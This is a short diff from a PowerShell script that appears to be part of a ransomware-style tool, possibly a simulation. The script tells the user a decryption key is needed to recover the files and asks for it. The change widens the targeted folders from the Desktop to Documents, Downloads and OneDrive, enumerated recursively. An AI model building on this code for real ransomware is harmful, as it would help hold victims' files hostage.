@@ -40,7 +40,7 @@ Write-Host "
 Write-Host "`nYou will need a deryption key to recover the files..`n"
 
 # Define Folders to Decrypt 
-$SourceFolder = "$env:USERPROFILE\Desktop" #,"$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
+$SourceFolder = "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
 $files = Get-ChildItem -Path $SourceFolder -File -Recurse
 
 # Ask for decryption Key
